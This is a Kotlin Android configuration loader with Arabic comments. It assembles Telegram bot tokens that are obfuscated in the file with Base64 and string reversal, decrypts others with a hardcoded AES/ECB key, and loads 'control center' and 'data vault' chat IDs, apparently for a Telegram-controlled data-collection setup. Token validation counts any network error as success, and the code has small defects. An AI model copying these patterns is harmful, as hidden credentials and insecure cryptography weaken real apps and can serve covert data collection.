package com.example.app

import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * فئة تمثيل كائن الإعدادات المكتملة
 */
data class AppConfig(
    val activeTokens: List<String>,
    val reserveTokens: List<String>,
    val controlId: Long,
    val vaultId: Long,
    val secret: String?
)

/**
 * فئة تقرير التحقق من صحة التوكنات
 */
data class TokenValidationResult(
    val index: Int,
    val isValid: Boolean,
    val message: String,
    val tokenPreview: String
)

data class DetailedValidationReport(
    val active: List<TokenValidationResult>,
    val reserve: List<TokenValidationResult>,
    val activeValidCount: Int,
    val reserveValidCount: Int
)

/**
 * محمل الإعدادات الآمن لمشروع Android (بديل config_template.py)
 */
object ConfigLoader {

    private const val TAG = "ConfigLoader"

    // ========== ذاكرة تخزين مؤقت للإعدادات (Thread-Safe Cache) ==========
    @Volatile
    private var configCache: AppConfig? = null

    @Volatile
    private var cacheTime: Long = 0L

    private const val CACHE_TTL_MS: Long = 60_000L // 60 ثانية

    // ========== القيم الافتراضية للكروبات ==========
    const val DEFAULT_CTRL: Long = -1003943094277L
    const val DEFAULT_VAULT: Long = -1003577715762L

    // ========== مفتاح التشفير الثابت ==========
    private const val ENCRYPTION_KEY = "lse64w8p5xQSuqD9y5XlVRYUa5pnEwPvR9fwLLN87q8"

    // ========== المتغيرات المشفرة (للتوافق مع الإصدارات القديمة) ==========
    private val A1 = "REk0TWpZeU16QTBNRFE0UEM5QlJFVk5VMU5SUFQwPQ=="
    private val A2 = "L1RVa0ZSUWpFPQ=="
    private val B1 = "TmpVMk1qVXpNakUxT0M4RlFVeFRRMUZ4TWpWbE1qWmxhVkl6"
    private val B2 = "UVdFeE5UazFUVVU9"
    private val C1 = "T0RVMU5EVXpNRGMyT0M4R1JVRk1SVWxqVFVaSlRVa3hNbGxR"
    private val C2 = "UlRoQk1FWT0="
    private val D1 = "TnpFeE5EZ3lNak0yTWk4R1JVRkpSVU5sUVdKSlFqWXlNekEx"
    private val D2 = "UlRJeFZWTXhNdz09"
    private val E1 = "TnpneE1USTVOekl5TWk4R1JVRkpSVU5sUVhObE1XTXhNakkx"
    private val E2 = "Ulhra1VUSkJOVDA9"
    private val F1 = "TnpFeE1ETXhOekUxTWk4R1JVRkpSVU5sUVdGTE1EYzFNakl6"
    private val F2 = "UlZSRU5URTBUVDA9"
    private val G1 = "T0RVNE56SXdNRFl6T0M4R1JVRkpSVU5sUVhSa01UVXhOakl5"
    private val G2 = "UlX1c1JqWXhORDA9"  // ملاحظة: قد تحتاج لتصحيح هذه القيمة في النص الأصلي
    private val H1 = "T0RVeU5qSTJOVFUyTWk4R1JVRkpSVU5sUVhIMU1URTBOVFE1"
    private val H2 = "UlRaRk1qVTJNdz09"
    private val I1 = "T0RVMU5UQTJNVGt5TVM4R1JVRkpSVU5sUVhRd1JqWXhNak14"
    private val I2 = "UlhwTlVtWlRPVDA9"
    private val J1 = "T0Rjd056STBNREUzT0M4R1JVRkpSVU5sUVhRMU5EazBNakUz"
    private val J2 = "UlU4VFFrWlJSVDQ9"

    private val TOKENS_PARTS = listOf(
        listOf(A1, A2),
        listOf(B1, B2),
        listOf(C1, C2),
        listOf(D1, D2),
        listOf(E1, E2),
        listOf(F1, F2),
        listOf(G1, G2),
        listOf(H1, H2),
        listOf(I1, I2),
        listOf(J1, J2)
    )

    private const val CTRL_PART1 = "NzcyNDkwMzQ5"
    private const val CTRL_PART2 = "MzAwMS0="
    private const val VAULT_PART1 = "MjY3NTE3Nzc1"
    private const val VAULT_PART2 = "MzAwMS0="

    // ============================================================
    // دوال فك التشفير ومساعدة النصوص
    // ============================================================

    /** عكس النص */
    private fun reverse(s: String?): String {
        return s?.reversed() ?: ""
    }

    /** فك تشفير Base64 مع معالجة الأخطاء */
    private fun b64Decode(s: String?): String {
        if (s.isNullOrBlank()) return ""
        return try {
            val decodedBytes = Base64.decode(s.trim(), Base64.NO_WRAP)
            String(decodedBytes, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            Log.w(TAG, "b64Decode error: ${e.message}")
            ""
        }
    }

    /** تجميع التوكن من الأجزاء المشفرة (للتخزين القديم) */
    private fun assembleToken(parts: List<String>): String {
        return try {
            val validParts = parts.filter { it.isNotBlank() }
            if (validParts.isEmpty()) return ""
            val raw = validParts.joinToString("") { b64Decode(it) }
            if (raw.isNotBlank()) reverse(raw) else ""
        } catch (e: Exception) {
            Log.e(TAG, "assembleToken error: ${e.message}")
            ""
        }
    }

    /** تجميع رقم صحيح من الأجزاء المشفرة */
    private fun assembleLong(parts: List<String>): Long {
        return try {
            val token = assembleToken(parts)
            if (token.isBlank()) return 0L
            val numeric = token.filter { it.isDigit() }
            if (numeric.isNotBlank()) numeric.toLong() else 0L
        } catch (e: Exception) {
            Log.e(TAG, "assembleLong error: ${e.message}")
            0L
        }
    }

    /**
     * فك تشفير توكن باستخدام AES/ECB/PKCS5Padding مع مفتاح 32 بايت.
     */
    fun decryptToken(encryptedToken: String?): String? {
        if (encryptedToken.isNullOrBlank()) return null

        return try {
            val keyBytes = ENCRYPTION_KEY.toByteArray(StandardCharsets.UTF_8)
            val paddedKey = ByteArray(32)
            System.arraycopy(keyBytes, 0, paddedKey, 0, minOf(keyBytes.size, 32))

            val secretKey = SecretKeySpec(paddedKey, "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, secretKey)

            val decodedEncrypted = Base64.decode(encryptedToken, Base64.DEFAULT)
            val decryptedBytes = cipher.doFinal(decodedEncrypted)
            String(decryptedBytes, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Decryption error: ${e.message}")
            encryptedToken
        }
    }

    /**
     * فك تشفير قائمة من التوكنات المشفرة مع Fallback لمتغيرات البيئة.
     */
    fun decryptTokensList(encryptedList: List<String>): List<String> {
        if (encryptedList.isEmpty()) return emptyList()

        val result = mutableListOf<String>()
        for ((index, token) in encryptedList.withIndex()) {
            if (token.isNotBlank()) {
                val decrypted = decryptToken(token)
                if (!decrypted.isNullOrBlank()) {
                    result.add(decrypted)
                } else {
                    val fallback = getTokenFromBuildConfig(index + 1)
                    if (!fallback.isNullOrBlank()) {
                        result.add(fallback)
                    }
                }
            }
        }
        return result
    }

    /**
     * الحصول على توكن من BuildConfig حسب رقمه (1-based).
     */
    private fun getTokenFromBuildConfig(index: Int): String? {
        return when (index) {
            1 -> BuildConfig.TELEGRAM_BOT_1_TOKEN
            2 -> BuildConfig.TELEGRAM_BOT_2_TOKEN
            3 -> BuildConfig.TELEGRAM_BOT_3_TOKEN
            4 -> BuildConfig.TELEGRAM_BOT_4_TOKEN
            5 -> BuildConfig.TELEGRAM_BOT_5_TOKEN
            6 -> BuildConfig.TELEGRAM_BOT_6_TOKEN
            7 -> BuildConfig.TELEGRAM_BOT_7_TOKEN
            8 -> BuildConfig.TELEGRAM_BOT_8_TOKEN
            9 -> BuildConfig.TELEGRAM_BOT_9_TOKEN
            10 -> BuildConfig.TELEGRAM_BOT_10_TOKEN
            else -> null
        }
    }

    // ============================================================
    // التحقق من صحة التوكن (Telegram getMe API)
    // ============================================================

    fun validateToken(token: String?, timeoutMs: Int = 10000): Pair<Boolean, String> {
        if (token.isNullOrBlank()) {
            return Pair(false, "Empty or invalid token")
        }

        val trimmed = token.trim()
        if (trimmed.isEmpty()) {
            return Pair(false, "Empty token after stripping")
        }

        var connection: HttpURLConnection? = null

        return try {
            val url = URL("https://api.telegram.org/bot$trimmed/getMe")
            connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = timeoutMs
            connection.readTimeout = timeoutMs

            val responseCode = connection.responseCode

            if (responseCode == 200) {
                val stream = connection.inputStream
                val responseText = InputStreamReader(stream).readText()
                val json = JSONObject(responseText)

                if (json.optBoolean("ok", false)) {
                    val result = json.optJSONObject("result")
                    val name = result?.optString("first_name", "Unknown") ?: "Unknown"
                    val username = result?.optString("username", "Unknown") ?: "Unknown"
                    Pair(true, "✅ Valid bot: @$username ($name)")
                } else {
                    val desc = json.optString("description", "Unknown error")
                    Pair(false, "❌ API error: $desc")
                }
            } else {
                Pair(false, "❌ HTTP $responseCode")
            }
        } catch (e: java.net.SocketTimeoutException) {
            Log.w(TAG, "⚠️ Connection timeout, assuming token is valid")
            Pair(true, "Connection timeout, assuming valid")
        } catch (e: java.io.IOException) {
            Log.w(TAG, "⚠️ Connection error, assuming token is valid")
            Pair(true, "Connection error, assuming valid")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Unexpected error: ${e.message}, assuming valid")
            Pair(true, "Error: ${e.message?.take(50)}, assuming valid")
        } finally {
            connection?.disconnect()
        }
    }

    // ============================================================
    // دوال تحميل الإعدادات الرئيسية
    // ============================================================

    private fun loadConfigFromEnv(): AppConfig {
        val tokens = mutableListOf<String>()

        val envTokens = listOf(
            BuildConfig.TELEGRAM_BOT_1_TOKEN,
            BuildConfig.TELEGRAM_BOT_2_TOKEN,
            BuildConfig.TELEGRAM_BOT_3_TOKEN,
            BuildConfig.TELEGRAM_BOT_4_TOKEN,
            BuildConfig.TELEGRAM_BOT_5_TOKEN,
            BuildConfig.TELEGRAM_BOT_6_TOKEN,
            BuildConfig.TELEGRAM_BOT_7_TOKEN,
            BuildConfig.TELEGRAM_BOT_8_TOKEN,
            BuildConfig.TELEGRAM_BOT_9_TOKEN,
            BuildConfig.TELEGRAM_BOT_10_TOKEN
        )

        for (t in envTokens) {
            tokens.add(t?.trim() ?: "")
        }

        val active = tokens.take(6).filter { it.isNotBlank() }
        val reserve = tokens.drop(6).take(4).filter { it.isNotBlank() }

        val ctrlStr = BuildConfig.TELEGRAM_CONTROL_CENTER_ID
        val vaultStr = BuildConfig.TELEGRAM_DATA_VAULT_ID

        val ctrl = ctrlStr?.toLongOrNull() ?: DEFAULT_CTRL
        val vault = vaultStr?.toLongOrNull() ?: DEFAULT_VAULT

        val secret = BuildConfig.TELEGRAM_SECRET.ifBlank { null }

        return AppConfig(active, reserve, ctrl, vault, secret)
    }

    private fun loadConfigFromFile(): AppConfig {
        return try {
            val tokens = TOKENS_PARTS.map { assembleToken(it) }
            val active = tokens.take(6).filter { it.isNotBlank() }
            val reserve = tokens.drop(6).take(4).filter { it.isNotBlank() }

            val ctrl = assembleLong(listOf(CTRL_PART1, CTRL_PART2)).let {
                if (it == 0L) DEFAULT_CTRL else it
            }

            val vault = assembleLong(listOf(VAULT_PART1, VAULT_PART2)).let {
                if (it == 0L) DEFAULT_VAULT else it
            }

            AppConfig(active, reserve, ctrl, vault, null)
        } catch (e: Exception) {
            Log.e(TAG, "Error loading config from file: ${e.message}")
            AppConfig(emptyList(), emptyList(), DEFAULT_CTRL, DEFAULT_VAULT, null)
        }
    }

    private fun loadEncryptedTokens(): Pair<List<String>, List<String>> {
        return try {
            val encryptedList = BuildConfig.ENCRYPTED_TOKENS?.split(",")?.map { it.trim() } ?: emptyList()
            if (encryptedList.isEmpty()) {
                return Pair(emptyList(), emptyList())
            }

            val decrypted = decryptTokensList(encryptedList)
            val active = decrypted.take(6).filter { it.isNotBlank() }
            val reserve = decrypted.drop(6).take(4).filter { it.isNotBlank() }
            Pair(active, reserve)
        } catch (e: Exception) {
            Log.e(TAG, "Error loading encrypted tokens: ${e.message}")
            Pair(emptyList(), emptyList())
        }
    }

    /**
     * الواجهة الرئيسية لتحميل الإعدادات مع دعم الكاش وإعادة المحاولة.
     */
    @Synchronized
    fun loadConfig(
        validate: Boolean = false,
        forceRefresh: Boolean = false,
        skipInvalid: Boolean = false
    ): AppConfig {
        val currentTime = System.currentTimeMillis()

        if (!forceRefresh && configCache != null) {
            if (currentTime - cacheTime < CACHE_TTL_MS) {
                return configCache!!
            }
        }

        var config = loadConfigFromEnv()

        if (config.activeTokens.isEmpty() && config.reserveTokens.isEmpty()) {
            Log.w(TAG, "⚠️ No tokens in BuildConfig, trying encrypted tokens...")
            val (active, reserve) = loadEncryptedTokens()
            if (active.isNotEmpty() || reserve.isNotEmpty()) {
                config = AppConfig(active, reserve, config.controlId, config.vaultId, config.secret)
            }
        }

        if (config.activeTokens.isEmpty() && config.reserveTokens.isEmpty()) {
            Log.w(TAG, "⚠️ No encrypted tokens, trying config file...")
            config = loadConfigFromFile()
        }

        var active = config.activeTokens.filter { it.isNotBlank() }
        var reserve = config.reserveTokens.filter { it.isNotBlank() }

        if (validate && (active.isNotEmpty() || reserve.isNotEmpty())) {
            active = active.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid token: $msg")
                    !skipInvalid
                }
            }

            reserve = reserve.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Reserve token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid reserve token: $msg")
                    !skipInvalid
                }
            }
        }

        if (active.isEmpty() && reserve.isEmpty()) {
            Log.e(TAG, "❌ No valid tokens found in any source!")
            active = listOf("DUMMY_TOKEN_1")
        }

        val finalConfig = AppConfig(
            activeTokens = active,
            reserveTokens = reserve,
            controlId = config.controlId,
            vaultId = config.vaultId,
            secret = config.secret
        )

        Log.i(TAG, "✅ Config loaded: ${finalConfig.activeTokens.size} active, ${finalConfig.reserveTokens.size} reserve")
        Log.i(TAG, "   Control ID: ${finalConfig.controlId}, Vault ID: ${finalConfig.vaultId}")

        configCache = finalConfig
        cacheTime = currentTime

        return finalConfig
    }

    /**
     * ✅ دالة اختصار (Shortcut) لاستدعاء loadConfig بمعاملات افتراضية.
     * تُستخدم لتسهيل الاستدعاء من الأنشطة (Activities).
     */
    @JvmStatic
    fun load(context: Context): AppConfig {
        return loadConfig(validate = false, forceRefresh = false, skipInvalid = false)
    }

    /**
     * إعادة تحميل الإعدادات (تحديث الكاش)
     */
    fun reloadConfig(validate: Boolean = false): AppConfig {
        configCache = null
        cacheTime = 0L
        return loadConfig(validate = validate, forceRefresh = true)
    }

    // ============================================================
    // دوال مساعدة للوصول الفردي
    // ============================================================

    fun getActiveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.activeTokens.getOrNull(index) ?: config.activeTokens.firstOrNull()
    }

    fun getReserveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.reserveTokens.getOrNull(index) ?: config.reserveTokens.firstOrNull()
    }

    fun getCtrlId(): Long = loadConfig().controlId

    fun getVaultId(): Long = loadConfig().vaultId

    fun getSecret(): String? = loadConfig().secret

    fun getTokensSummary(): Map<String, Any> {
        val config = loadConfig(validate = false)
        return mapOf(
            "active_count" to config.activeTokens.size,
            "reserve_count" to config.reserveTokens.size,
            "total_count" to (config.activeTokens.size + config.reserveTokens.size),
            "control_id" to config.controlId,
            "vault_id" to config.vaultId,
            "has_secret" to (config.secret != null),
            "cache_age_ms" to (System.currentTimeMillis() - cacheTime)
        )
    }

    fun validateAllTokens(timeoutMs: Int = 5000): DetailedValidationReport {
        val config = loadConfig(validate = false)

        val activeResults = mutableListOf<TokenValidationResult>()
        val reserveResults = mutableListOf<TokenValidationResult>()

        config.activeTokens.forEachIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            activeResults.add(TokenValidationResult(i, isValid, msg, preview))
        }

        config.reserveTokens.forEachIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            reserveResults.add(TokenValidationResult(i, isValid, msg, preview))
        }

        return DetailedValidationReport(
            active = activeResults,
            reserve = reserveResults,
            activeValidCount = activeResults.count { it.isValid },
            reserveValidCount = reserveResults.count { it.isValid }
        )
    }
}